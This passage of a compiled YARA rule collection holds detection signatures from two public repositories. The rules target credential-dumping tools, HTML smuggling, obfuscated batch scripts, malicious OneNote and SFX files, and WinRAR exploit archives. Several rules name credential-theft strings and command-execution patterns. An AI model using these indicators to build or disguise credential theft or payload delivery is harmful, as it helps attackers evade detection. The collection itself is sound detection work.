		$s3 = "cmd.exe /u /c del" wide

	condition:
		uint16( 0 ) == 0x5a4d and 2 of ( $s* )
}
rule SBOUSSEADEN_Infinityhook : FILE
{
	meta:
		description = "Infinityhook is a legit research PoC to hook NT Syscalls bypassing PatchGuard"
		author = "SBousseaden"
		id = "82f4eef2-fca7-58b1-a85c-3c237f523740"
		date = "2020-09-07"
		modified = "2020-07-10"
		reference = "https://github.com/everdox/InfinityHook"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/infinityhook.yara#L1-L17"
		license_url = "N/A"
		logic_hash = "c621ce3be8049de7584af73ca4472df5561d3c4ac8b458937db2ad68fdcbe2d8"
		score = 75
		quality = 73
		tags = "FILE"

	strings:
		$EtwpDebuggerPattern = {00 2C 08 04 38 0C 00}
		$SMV = {00 00 76 66 81 3A 02 18 50 00 75 0E 48 83 EA 08 B8 33 0F 00}
		$KVASCODE = {4B 56 41 53 43 4F 44 45}
		$CKL = "Circular Kernel Context Logger" wide nocase

	condition:
		uint16( 0 ) == 0x5a4d and all of them
}
rule SBOUSSEADEN_Hunt_Susp_Vhd : FILE
{
	meta:
		description = "Virtual hard disk file with embedded PE"
		author = "SBousseaden"
		id = "14b082b2-c5cd-5f34-85e9-5987650eaacd"
		date = "2020-07-13"
		modified = "2020-07-13"
		reference = "https://github.com/sbousseaden/YaraHunts/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_susp_vhd.yara#L1-L12"
		license_url = "N/A"
		logic_hash = "4ba2e3f533942b27c1d235be4677afdac774b558429c414043a8e3a609123ad3"
		score = 65
		quality = 73
		tags = "FILE"

	strings:
		$hvhd = {636F6E6563746978}
		$s1 = {4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00}
		$s2 = "!This program cannot be run in DOS mode." base64
		$s3 = "!This program cannot be run in DOS mode." xor

	condition:
		$hvhd at 0 and any of ( $s* ) and filesize <= 10MB
}

rule SBOUSSEADEN_Maliciousdllgenerator : FILE
{
	meta:
		description = "MaliciousDLLGenerator default decoder and export name"
		author = "SBousseaden"
		id = "a5f4d0b2-ef40-5e69-935e-208464944487"
		date = "2020-06-07"
		modified = "2020-06-08"
		reference = "https://github.com/Mr-Un1k0d3r/MaliciousDLLGenerator"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/MaliciousDLLGenerator.yara#L3-L12"
		license_url = "N/A"
		logic_hash = "70976f4a7043f52277a1d436c1725b2583383880d7158c74c4d93f3e603708c7"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$decoder = {E8 00 00 00 00 5B 48 31 C0 48 89 C1 B1 80 48 83 C3 11 48 F7 14 CB E2 FA 48 83 C3 08 53 C3}

	condition:
		uint16( 0 ) == 0x5a4d and $decoder and pe.exports ( "Init" ) and pe.number_of_exports == 2
}
rule SBOUSSEADEN_Webcreds_Regexp_B64
{
	meta:
		description = "No description has been set in the source file - SBousseaden"
		author = "SBousseaden"
		id = "85283a81-5bc3-5e3f-89f6-bcc1f40f3dc2"
		date = "2020-03-08"
		modified = "2020-12-28"
		reference = "https://github.com/orlyjamie/mimikittenz/blob/master/Invoke-mimikittenz.ps1"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L24-L43"
		license_url = "N/A"
		logic_hash = "432c812177a50c50d08feb88a1293ecb625b9b0aa6a839789da150255bc83228"
		score = 75
		quality = 75
		tags = ""

	strings:
		$p1 = "&password=" base64
		$p2 = "&login_password=" base64
		$p3 = "&pass=" base64
		$p4 = "&Passwd=" base64
		$p5 = "&PersistentCookie=" base64
		$p6 = "password%5D=" base64
		$u1 = "&username=" base64
		$u2 = "&email=" base64
		$u3 = "login=" base64
		$u4 = "login_email=" base64
		$u5 = "user%5Bemail%5D=" base64
		$reg = ".{1,"

	condition:
		3 of ( $p* ) and 3 of ( $u* ) and #reg > 3
}
rule SBOUSSEADEN_Adsync_Creddump_Xor
{
	meta:
		description = "Azure AdSync Service Account Password Dumping"
		author = "SBousseaden"
		id = "e0d951ec-ec39-5f37-b5a8-ddd0b1dc588d"
		date = "2020-03-08"
		modified = "2020-12-28"
		reference = "https://blog.xpnsec.com/azuread-connect-for-redteam/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L69-L89"
		license_url = "N/A"
		logic_hash = "831ed0410000ad9dfa7be2ab1f64a4130810465cf699bb3e45c93075db6fdb74"
		score = 75
		quality = 75
		tags = ""

	strings:
		$a1 = "private_configuration_xml" xor
		$a2 = "LoadKeySet" xor
		$a3 = "encrypted_configuration" xor
		$a4 = "GetActiveCredentialKey" xor
		$a5 = "DecryptBase64ToString" xor
		$a6 = "Cryptography.KeyManager" xor
		$b1 = "mms_management_agent" xor
		$b2 = "Microsoft Azure AD Sync\\Bin\\mcrypt.dl" xor
		$b3 = "xp_cmdshell" xor
		$b4 = "Password" xor
		$b5 = "forest-login-user" xor
		$b6 = "forest-login-domain" xor

	condition:
		4 of ( $a* ) or 4 of ( $b* )
}
rule SBOUSSEADEN_Adsync_Creddump_V64
{
	meta:
		description = "Azure AdSync Service Account Password Dumping"
		author = "SBousseaden"
		id = "9f536ff2-95b6-5f93-8c6f-e3738d6404c7"
		date = "2020-03-08"
		modified = "2020-12-28"
		reference = "https://blog.xpnsec.com/azuread-connect-for-redteam/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L91-L111"
		license_url = "N/A"
		logic_hash = "e2465fec6dd9384d5d7f31f1c0e7661f4fbd5e3f87a14abfcb9b0412985cb1d6"
		score = 75
		quality = 75
		tags = ""

	strings:
		$a1 = "private_configuration_xml" base64
		$a2 = "LoadKeySet" base64
		$a3 = "encrypted_configuration" base64
		$a4 = "GetActiveCredentialKey" base64
		$a5 = "DecryptBase64ToString" base64
		$a6 = "Cryptography.KeyManager" base64
		$b1 = "mms_management_agent" base64
		$b2 = "Microsoft Azure AD Sync\\Bin\\mcrypt.dl" base64
		$b3 = "xp_cmdshell" base64
		$b4 = "Password" base64
		$b5 = "forest-login-user" base64
		$b6 = "forest-login-domain" base64

	condition:
		4 of ( $a* ) or 4 of ( $b* )
}
rule SBOUSSEADEN_Adsync_Creddump_Xwide
{
	meta:
		description = "Azure AdSync Service Account Password Dumping"
		author = "SBousseaden"
		id = "a8c3e60a-99b8-50c8-992c-fbe18499a615"
		date = "2020-03-08"
		modified = "2020-12-28"
		reference = "https://blog.xpnsec.com/azuread-connect-for-redteam/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L112-L132"
		license_url = "N/A"
		logic_hash = "9015005494cb3cc52645a9c82f6179992942243a816b05273bc26f58ac70a2e0"
		score = 75
		quality = 75
		tags = ""

	strings:
		$a1 = "private_configuration_xml" wide xor
		$a2 = "LoadKeySet" wide xor
		$a3 = "encrypted_configuration" wide xor
		$a4 = "GetActiveCredentialKey" wide xor
		$a5 = "DecryptBase64ToString" wide xor
		$a6 = "Cryptography.KeyManager" wide xor
		$b1 = "mms_management_agent" wide xor
		$b2 = "Microsoft Azure AD Sync\\Bin\\mcrypt.dl" wide xor
		$b3 = "xp_cmdshell" wide xor
		$b4 = "Password" wide xor
		$b5 = "forest-login-user" wide xor
		$b6 = "forest-login-domain" wide xor

	condition:
		4 of ( $a* ) or 4 of ( $b* )
}
/*
 * YARA Rule Set
 * Repository Name: Elceef
 * Repository: https://github.com/elceef/yara-rulz
 * Retrieval Date: 2026-11-22
 * Git Commit: 5683b294a12cf0c875b624933586029ae43a852f
 * Number of Rules: 16
 * Skipped: 0 (age), 4 (quality), 0 (score), 0 (importance)
 *
 * 
 * LICENSE
 * 
 * MIT License

Copyright (c) 2022 Marcin Ulikowski

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

 */
rule ELCEEF_Suspicious_SFX : FILE
{
	meta:
		description = "Detects self-extracting archives (SFX) executing cmd.exe or powershell.exe"
		author = "marcin@ulikowski.pl"
		id = "78f4ae8b-ba17-5c02-a6f0-66bec873aba8"
		date = "2023-04-04"
		modified = "2023-04-04"
		reference = "https://www.crowdstrike.com/blog/self-extracting-archives-decoy-files-and-their-hidden-payloads/"
		source_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/rules/Suspicious_SFX.yara#L1-L22"
		license_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/LICENSE"
		logic_hash = "688ed356e2fa936a0e07a8479591c28fb457053ed94351bad4bf367b02f04b0a"
		score = 65
		quality = 73
		tags = "FILE"

	strings:
		$rar = { 52 61 72 21 }
		$zip = { 50 4b 03 04 }
		$setup_cmd = "\nSetup=cmd"
		$setup_powershell = "\nSetup=powershell"
		$silent = "\nSilent=1"

	condition:
		filesize < 1MB and uint16be( 0 ) == 0x4d5a and any of ( $zip , $rar ) and any of ( $setup_* ) and $silent
}
rule ELCEEF_HTML_Smuggling_A : T1027 FILE
{
	meta:
		description = "Generic detection for HTML smuggling (T1027.006)"
		author = "marcin@ulikowski.pl"
		id = "b711318f-81d2-5d0b-968f-04ae18fdea5b"
		date = "2021-05-13"
		modified = "2023-04-16"
		reference = "https://github.com/elceef/yara-rulz"
		source_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/rules/HTML_Smuggling.yara#L1-L31"
		license_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/LICENSE"
		hash = "279d5ef8f80aba530aaac8afd049fa171704fc703d9cfe337b56639732e8ce11"
		logic_hash = "bc076e9f3d4c6d2aa5a3602436408e5b2ac3140ca9f7cc776c44835cba211951"
		score = 75
		quality = 75
		tags = "T1027, FILE"

	strings:
		$mssave = { ( 2e | 22 | 27 ) 6d 73 53 61 76 65 }
		$element = { ( 2e | 22 | 27 ) 63 72 65 61 74 65 45 6c 65 6d 65 6e 74 ( 28 | 22 | 27 ) }
		$objecturl = { ( 2e | 22 | 27 ) 63 72 65 61 74 65 4f 62 6a 65 63 74 55 52 4c ( 28 | 22 | 27 ) }
		$download = { ( 2e | 22 | 27 ) 64 6f 77 6e 6c 6f 61 64 ( 3d | 22 | 27 ) }
		$click = { ( 2e | 22 | 27 ) 63 6c 69 63 6b ( 3d | 22 | 27 ) }
		$atob = { 61 74 6f 62 ( 28 | 22 | 27 ) }
		$blob = "new Blob("
		$array = "new Uint8Array("
		$ole2 = "0M8R4KGxGuEA"
		$pe32 = "TVqQAAMAAAAE"
		$iso = "AAAABQ0QwMDE"
		$udf = "AAAAQkVBMDEB"
		$zip = { 55 45 73 44 42 ( 41 | 42 | 43 | 44 ) ( 6f | 30 | 4d | 51 ) ( 41 | 44 ) ( 41 | 43 ) }
		$jsxor = { 2e 63 68 61 72 43 6f 64 65 41 74 28 [1-10] 29 ( 5e | 20 5e ) }

	condition:
		filesize < 5MB and ( $mssave or ( #element == 1 and #objecturl == 1 and #download == 1 and #click == 1 ) ) and $blob and $array and $atob and ( #ole2 + #pe32 + #iso + #udf + #zip + #jsxor ) == 1
}
rule ELCEEF_HTML_Smuggling_B : T1027 FILE
{
	meta:
		description = "Generic detection for HTML smuggling (T1027.006)"
		author = "marcin@ulikowski.pl"
		id = "640d70c2-f1fc-5e32-a720-ebc92839ec40"
		date = "2022-12-02"
		modified = "2023-04-16"
		reference = "https://github.com/elceef/yara-rulz"
		source_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/rules/HTML_Smuggling.yara#L33-L60"
		license_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/LICENSE"
		hash = "63955db0ccd6c0613912afb862635bde0fa925847f27adc8a0d65c994a7e05ea"
		logic_hash = "3c42e6f715bd5476aea4d47e9f6431747ddf7c7c8098840560201e2c21723eeb"
		score = 75
		quality = 75
		tags = "T1027, FILE"

	strings:
		$objecturl = { ( 2e | 22 | 27 ) 63 72 65 61 74 65 4f 62 6a 65 63 74 55 52 4c ( 28 | 22 | 27 ) }
		$atob = "atob("
		$blob = "new Blob("
		$file = "new File(["
		$array = "new Uint8Array("
		$ole2 = "0M8R4KGxGuEA"
		$pe32 = "TVqQAAMAAAAE"
		$iso = "AAAABQ0QwMDE"
		$udf = "AAAAQkVBMDEB"
		$zip = { 55 45 73 44 42 ( 41 | 42 | 43 | 44 ) ( 6f | 30 | 4d | 51 ) ( 41 | 44 ) ( 41 | 43 ) }
		$jsxor = { 2e 63 68 61 72 43 6f 64 65 41 74 28 [1-10] 29 ( 5e | 20 5e ) }

	condition:
		filesize < 5MB and $atob and #objecturl == 1 and #file == 1 and #blob == 1 and #array == 1 and ( #ole2 + #pe32 + #iso + #udf + #zip + #jsxor ) == 1
}
rule ELCEEF_HTML_Smuggling_C : T1027 FILE
{
	meta:
		description = "Generic detection for HTML smuggling (T1027.006)"
		author = "marcin@ulikowski.pl"
		id = "ea1eafad-905b-571e-a016-8774e65bd976"
		date = "2023-04-17"
		modified = "2023-04-17"
		reference = "https://github.com/elceef/yara-rulz"
		source_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/rules/HTML_Smuggling.yara#L62-L82"
		license_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/LICENSE"
		hash = "0b4cdfc8ae8ae17d7b6786050f1962c19858b91febb18f61f553083f57d96fea"
		hash = "2b99bf97f3d02ba3b44406cedd1ab31824723b56a8aae8057256cc87870c199e"
		hash = "904ea1ada62cfd4b964a6a3eb9bab5b98022ab000f77b75eb265a2ac44b45b37"
		logic_hash = "83409b0b173980975f6349e448e72fe1b2115fc7dbdec8ee7ad1826a65db17d3"
		score = 75
		quality = 75
		tags = "T1027, FILE"

	strings:
		$blob = "new Blob("
		$array = "new Uint8Array("
		$mssave = { ( 2e | 22 | 27 ) 6d 73 53 61 76 65 }
		$loop = { ?? 5b 69 5d ( 3d | 20 3d | 3d 20 | 20 3d 20 ) ?? 5b 69 5d ( 2d | 20 2d | 2d 20 | 20 2d 20 ) 3? 3b }

	condition:
		filesize < 5MB and $mssave and #blob == 1 and #array == 1 and #loop == 1
}
rule ELCEEF_Suspicious_Onenote
{
	meta:
		description = "Detects OneNote documents with FileDataStoreObject structure containing: PE32, shortcut files (*.lnk), encoded JS, Windows Help File (*.chm), or batch script"
		author = "marcin@ulikowski.pl"
		id = "57f6fc7f-666f-5887-ac97-513588415757"
		date = "2023-01-22"
		modified = "2023-02-21"
		reference = "https://github.com/elceef/yara-rulz"
		source_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/rules/Suspicious_OneNote.yara#L1-L23"
		license_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/LICENSE"
		hash = "f408ef3fa89546483ba63f58be3f27a98795655eb4b9b6217cbe302a5ba9d5f7"
		hash = "5306fa7940b4d67dfb031fd315b661cecb2ce81e2f34c9393e1826df0f0bbdc5"
		hash = "e1d34ad42938a777d80f3ee4c206de14021f13ab79600168b85894fdb0867b3e"
		hash = "9e89231578d8b9b190de3288fd10f43cf11a24963a8b0a76f0c46170deda59fd"
		hash = "6778c59a29e25d722230163bea272ece58d2d3696fbce4347c20104e8fb735dc"
		logic_hash = "b65f0976b71c1e827ecce09f0c435d9ffa6a5d3b3a41401efc6a14b6259af4ad"
		score = 65
		quality = 75
		tags = ""

	strings:
		$magic = { ae b1 53 78 d0 29 96 d3 }
		$fdso_pe32 = { a4 c4 8d 4d 0b 7a 9e ac [20] 4d 5a }
		$fdso_bat = { a4 c4 8d 4d 0b 7a 9e ac [20] 40 65 63 68 6f 20 6f 66 66 }
		$fdso_lnk = { a4 c4 8d 4d 0b 7a 9e ac [20] 4c 00 00 00 01 14 02 00 }
		$fdso_jse = { a4 c4 8d 4d 0b 7a 9e ac [20] 23 40 7e 5e }
		$fdso_chm = { a4 c4 8d 4d 0b 7a 9e ac [20] 49 54 53 46 03 }

	condition:
		$magic at 8 and 1 of ( $fdso_* )
}
rule ELCEEF_BAT_Obfuscated_Setenv
{
	meta:
		description = "Detects batch script with obfuscated SET command located directly after @echo off"
		author = "marcin@ulikowski.pl"
		id = "999d192e-a792-5953-b9e2-de4b298444d3"
		date = "2023-05-01"
		modified = "2023-05-05"
		reference = "https://twitter.com/wdormann/status/1651631372438585344"
		source_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/rules/Suspicious_BAT.yara#L1-L20"
		license_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/LICENSE"
		hash = "a0f43c5748ada07a12af81dda2460045030f936a8d5081f3a403f85c2a9668f8"
		hash = "1a0ca873412474a6437d33e48071aa0169f8317b5c996e1b10a41791707b2cf5"
		hash = "83e47d4f3dd43ed01dc573f0b83e9e71f0ec75b6ea5712f640585d01d8aedf3c"
		hash = "cf351a2b1f0a157a92be2e01e460140e2c1d0ee1685474144f2203a97d2de489"
		logic_hash = "da3a2245207d79cb720079cc2bc88d5f9db22fc16601d21e7c8dcea381ed11e9"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = { 40 65 63 68 6f 20 6f 66 66 0d 0a ( 73 65 25 | 73 25 | 25 ) [2-26] 3a 7e [0-6] 3? 25 ( 25 | 20 | 65 25 | 74 20 | 65 74 20 ) }
		$s2 = { 40 65 63 68 6f 20 6f 66 66 0d 0a 73 65 74 20 22 [4] 3d 73 65 74 20 22 0d 0a 25 }

	condition:
		$s1 in ( 0 .. 4 ) or $s2 in ( 0 .. 4 )
}
rule ELCEEF_BAT_Chunked_Payload_Setenv
{
	meta:
		description = "Detects batch script storing chunks of payload in random environment variables"
		author = "marcin@ulikowski.pl"
		id = "18f3ddac-bc19-5b54-891e-93271d59490a"
		date = "2023-05-05"
		modified = "2024-04-10"
		reference = "https://github.com/elceef/yara-rulz"
		source_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/rules/Suspicious_BAT.yara#L22-L37"
		license_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/LICENSE"
		hash = "f73521adbf89be99c4d7ea74ebf7fed815af49ce4dc060656d7c9c631e4d0538"
		logic_hash = "6b202d1a5723db664c7ca689c73fc1f84365801fd56fc9a035c8d3a0b6b2b9da"
		score = 75
		quality = 75
		tags = ""

	strings:
		$echo = "@echo off"
		$set = { ( 0d 0a | 26 20 ) 73 65 74 20 22 [10] 3d [2-6] 22 }

	condition:
		$echo in ( 0 .. 4 ) and #set > 10
}
rule ELCEEF_BAT_Begin_Substring_Env
{
	meta:
		description = "Detects suspicious substring syntax at the begining of batch script"
		author = "marcin@ulikowski.pl"
		id = "3fca187b-d2e7-595c-9330-25141a54285b"
		date = "2023-06-02"
		modified = "2024-04-10"
		reference = "https://cybersecurity.att.com/blogs/labs-research/seroxen-rat-for-sale"
		source_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/rules/Suspicious_BAT.yara#L39-L55"
		license_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/LICENSE"
		hash = "8ace121fae472cc7ce896c91a3f1743d5ccc8a389bc3152578c4782171c69e87"
		logic_hash = "cc5e6e511bbc0a5cbb277ed0cbac1f2b21db8e21c4cdc802b6a1c3313d3b55cc"
		score = 65
		quality = 75
		tags = ""

	strings:
		$echo = "@echo off"
		$substr = { 3a 7e ( 3? 2c 3? | 2d 3? 2c 3? | 3? 2c 2d 3? | 3? 3? 2c 3? | 2d 3? 3? 2c 3? | 3? 3? 2c 2d 3? ) 25 }

	condition:
		$echo in ( 0 .. 4 ) and $substr in ( 10 .. 100 )
}
rule ELCEEF_Polymorph_BAT_CAB : FILE
{
	meta:
		description = "Detects polymorphic BAT/CAB files self-extracting payload with extrac32.exe/extract.exe"
		author = "marcin@ulikowski.pl"
		id = "10a46120-beaf-5443-bc35-c6d9ef065bb4"
		date = "2024-04-10"
		modified = "2024-04-10"
		reference = "https://github.com/elceef/yara-rulz"
		source_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/rules/Suspicious_BAT.yara#L57-L72"
		license_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/LICENSE"
		hash = "f1296b12925108a5d675a8b9c2033c0b749b121ae3b5a6a912ce4418daa06d99"
		logic_hash = "d29d488b0ebcfb485818c181ac674e3586aa1a41ab68185a1f1d3e49295ffbce"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$extract = { 65 78 74 72 61 63 ( 33 32 | 74 ) 20 2f 79 20 22 25 7e 66 30 22 }

	condition:
		uint32be( 0 ) == 0x4d534346 and uint32( 16 ) > 80 and $extract in ( 48 .. 80 )
}
rule ELCEEF_ZIP_High_Ratio_Single_Doc : FILE
{
	meta:
		description = "Detects ZIP archives containing single MS Word document with unusually high compression ratio"
		author = "marcin@ulikowski.pl"
		id = "0fbe89d9-1bf5-50a9-b6c1-1d739162a2ba"
		date = "2023-03-08"
		modified = "2023-03-08"
		reference = "https://github.com/elceef/yara-rulz"
		source_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/rules/ZIP_High_Ratio_Single_Doc.yara#L8-L27"
		license_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/LICENSE"
		hash = "4d9a6dfca804989d40eeca9bb2d90ef33f3980eb07ca89bbba06d0ef4b37634b"
		hash = "4bc2d14585c197ad3aa5836b3f7d9d784d7afe79856e0ddf850fc3c676b6ecb1"
		logic_hash = "470300b8d6356cff43a1e2be3a23a97be5d1e2ce5a76f2fb2eccdbbb47a4d327"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$magic = { 50 4b 03 04 }
		$ext = ".doc"

	condition:
		filesize < 1MB and $magic at 0 and #magic == 1 and uint32( 22 ) > 1024 * 1024 * 100 and $ext at ( uint16( 26 ) + 26 )
}
rule ELCEEF_Winrar_CVE_2023_38831_Exploit : CVE_2023_38831 FILE
{
	meta:
		description = "Detects ZIP archives exploiting CVE-2023-38831 in WinRAR"
		author = "marcin@ulikowski.pl"
		id = "7d592eb7-b344-59ed-adf8-fe69ebb1e43f"
		date = "2023-09-23"
		modified = "2023-09-28"
		reference = "https://www.group-ib.com/blog/cve-2023-38831-winrar-zero-day"
		source_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/rules/WinRAR_CVE_2023_38831.yara#L1-L17"
		license_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/LICENSE"
		hash = "00175d538cba0c493e397a0b7f4b28f9a90dd0ee40f69795ae28d23ce0d826c0"
		hash = "ca8ca67df7853b86b6a107c8fd7f73b757de9143ea8844d0e6209249e8377885"
		logic_hash = "06f1d807429fb175831cf333b05b44b6ce33b4ae981e16c03e36ec7564a4fdd1"
		score = 75
		quality = 75
		tags = "CVE-2023-38831, FILE"

	strings:
		$ = { 50 4b 03 04 [24] 00 00 [3-64] 2e ?? ?? ?? 20 2f [3-64] 2e ?? ?? ?? 20 2e ( 626174 | 636d64 | 707331 ) }

	condition:
		uint16be( 0 ) == 0x504b and all of them
}
rule ELCEEF_EICAR_Encrypted_ZIP
{
	meta:
		description = "Detects EICAR file in any encrypted ZIP archive"
		author = "marcin@ulikowski.pl"
		id = "c12d42de-356a-584b-9c48-71e65940f1cf"
		date = "2022-12-13"
		modified = "2022-12-16"
		reference = "https://github.com/elceef/yara-rulz"
		source_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/rules/EICAR_Encrypted_ZIP.yara#L14-L44"
		license_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/LICENSE"
		logic_hash = "56851056671bde38338bd200d9fde59c042f35a2cd84ac9401e716f376c9502c"
		score = 75
		quality = 75
		tags = ""

	strings:
		$local = {
			50 4b 03 04 // local file header signature (PK)
			?? 00 // minimum version
			?? 00 // flags (bit 0 and 6 indicate encryption)
			?? 00 // compression method
			?? ?? // last modification time
			?? ?? // last modification date
			?? ?? ?? ?? // CRC-32 of uncompressed and unencrypted data
			?? ?? ?? ?? // compressed size
			?? ?? ?? ?? // uncompressed size
			}

	condition:
		for any i in ( 1 .. #local ) : ( ( uint8( @local [ i ] + 6 ) & 0x01 or uint8( @local [ i ] + 6 ) & 0x40 ) and uint32( @local [ i ] + 14 ) == 0x6851cf3c and uint32( @local [ i ] + 22 ) == 68 )
}
rule ELCEEF_Base64_SVG_Javascript
{
	meta:
		description = "Detects base64 encoded SVG objects containing Javascript"
		author = "marcin@ulikowski.pl"
		id = "99275772-1f4f-5616-9a9c-f76b613fe143"
		date = "2022-10-25"
		modified = "2022-12-12"
		reference = "https://github.com/elceef/yara-rulz"
		source_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/rules/Base64_SVG_Javascript.yara#L1-L16"
		license_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/LICENSE"
		hash = "fe394a59e961c3fbcc326e7d0ee5909596de55249e669bc4da0aed172c11fda8"
		hash = "f0c94f2705b1aea17f4a6c6d71c6ed725fe71bf66b03b0117060010859ca8a19"
		logic_hash = "e4cb08ccc75dc00b518c4ee1495409ae6bb99e7d493be55312b8d39aa9099cfc"
		score = 75
		quality = 75
		tags = ""

	strings:
		$svg = "\"data:image/svg+xml;base64" wide ascii
		$js = "<script type=\"text/javascript\">" base64

	condition:
		all of them
}
rule ELCEEF_HTML_Windows_Search_Abuse
{
	meta:
		description = "Detects HTML files abusing Windows system functionalities to redirect and download malicious payloads"
		author = "marcin@ulikowski.pl"
		id = "537cb46e-4cfc-517c-8d6d-0019f2c3e5ef"
		date = "2024-06-15"
		modified = "2024-06-16"
		reference = "https://github.com/elceef/yara-rulz"
		source_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/rules/HTML_Windows_Search.yara#L1-L22"
		license_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/LICENSE"
		hash = "d136dcfc355885c502ff2c3be229791538541b748b6c07df3ced95f9a7eb2f30"
		logic_hash = "6a0d490cf08ab0aad3c535645abe9ebc26d12768cf2a2e932cdb7ec93cf3e2bd"
		score = 75
		quality = 73
		tags = ""

	strings:
		$location1 = "location.href" wide ascii
		$location2 = "location.replace(" wide ascii
		$location3 = "location.assign(" wide ascii
		$metarefresh = "<meta http-equiv=\"refresh\"" nocase wide ascii
		$search1 = "\"search-ms:query=" wide ascii
		$search2 = "\"search:query=" wide ascii
		$search3 = "URL=search:query=" wide ascii
		$crumb1 = "&crumb=location:" wide ascii
		$crumb2 = "&amp;crumb=location:" wide ascii

	condition:
		( any of ( $location* ) or $metarefresh ) and any of ( $search* ) and any of ( $crumb* )
}
rule ELCEEF_Winrar_CVE_2025_8088_Exploit : CVE_2025_8088 FILE
{
	meta:
		description = "Detects RAR archives exploiting CVE-2025-8088 in WinRAR"
		author = "marcin@ulikowski.pl"
		id = "546e2858-c04a-5f3c-94b9-54d5b7f364b5"
		date = "2025-08-18"
		modified = "2025-08-18"
		reference = "https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/"
		source_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/rules/WinRAR_CVE_2025_8088.yara#L1-L17"
		license_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/LICENSE"
		hash = "2a8fafa01f6d3863c87f20905736ebab28d6a5753ab708760c0b6cf3970828c3"
		logic_hash = "f3181b92294ad68467b6ce121170a91b423604fd152f27899a2f34879266e9d8"
		score = 75
		quality = 75
		tags = "CVE-2025-8088, FILE"

	strings:
		$ = { 00 03 53 54 4d [2-3] 3a ( 5c | 2e ) ( 5c | 2e ) ( 5c | 2e ) ( 5c | 2e ) }

	condition:
		uint32be( 0 ) == 0x52617221 and all of them
}
rule ELCEEF_HTA_Wscriptshell_Onenote : FILE
{
	meta:
		description = "Detects suspicious OneNote documents with embedded HTA + WScript.Shell"
		author = "marcin@ulikowski.pl"
